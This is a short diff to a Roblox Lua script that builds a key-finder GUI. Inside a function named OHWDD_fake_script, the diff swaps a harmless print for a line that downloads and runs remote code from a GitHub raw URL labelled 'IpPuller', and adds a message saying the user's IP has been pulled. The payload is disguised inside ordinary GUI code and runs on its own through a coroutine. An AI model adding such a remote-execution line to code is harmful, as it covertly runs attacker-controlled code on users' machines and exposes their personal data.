@@ -27,7 +27,6 @@ else
     MainGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     MainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
-    
     keyfindsystems.Name = "keyfindsystems"
     keyfindsystems.Parent = MainGui
     keyfindsystems.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
@@ -222,8 +221,8 @@ else
 
     
     local function OHWDD_fake_script()
-    wait(0)
-    print"Okay can we Stop"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/IpPuller"))()
+    print" we pulled your ip loaded ip puller"
     end
     coroutine.wrap(OHWDD_fake_script)()
     
